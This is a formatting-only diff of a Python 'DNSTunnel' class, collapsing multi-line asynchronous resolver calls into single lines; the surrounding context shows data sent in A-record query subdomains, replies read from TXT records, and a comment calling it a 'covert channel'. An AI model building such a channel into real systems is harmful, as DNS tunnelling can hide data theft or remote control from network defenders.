@@ -126,9 +126,7 @@ class DNSTunnel:
 
                 # Perform DNS query
                 try:
-                    await asyncio.get_event_loop().run_in_executor(
-                        None, self.resolver.resolve, query_domain, "A"
-                    )
+                    await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "A")
                 except DNSException:
                     # DNS queries may fail, that's okay for covert channel
                     pass
@@ -155,9 +153,7 @@ class DNSTunnel:
             query_domain = f"{query_id}.{self.domain}"
 
             # Query TXT records
-            answers = await asyncio.get_event_loop().run_in_executor(
-                None, self.resolver.resolve, query_domain, "TXT"
-            )
+            answers = await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "TXT")
 
             # Extract and decode data from TXT records
             txt_data = []
@@ -218,9 +214,7 @@ class DNSTunnel:
 
                     # Send DNS query
                     try:
-                        await asyncio.get_event_loop().run_in_executor(
-                            None, self.resolver.resolve, query_domain, "A"
-                        )
+                        await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, query_domain, "A")
                     except DNSException:
                         pass
 
@@ -257,9 +251,7 @@ class DNSTunnel:
         """
         try:
             test_domain = f"health.{self.domain}"
-            await asyncio.get_event_loop().run_in_executor(
-                None, self.resolver.resolve, test_domain, "A"
-            )
+            await asyncio.get_event_loop().run_in_executor(None, self.resolver.resolve, test_domain, "A")
             return True
         except Exception:
             return False
